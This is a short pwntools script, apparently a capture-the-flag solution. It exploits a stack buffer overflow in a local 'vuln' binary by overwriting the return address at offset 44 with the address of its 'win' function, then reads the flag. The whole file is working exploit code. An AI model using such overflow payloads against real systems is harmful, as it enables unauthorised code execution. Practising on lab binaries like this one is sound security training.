from pwn import *

exe = context.binary = ELF('vuln')
winaddr = exe.symbols['win']
io = remote('localhost', 1118) #exe.process()

payload = fit({
    44: winaddr
})

io.recvuntil(b'Please enter your string: \n')
io.sendline(payload)
io.interactive()
flag = io.recvline()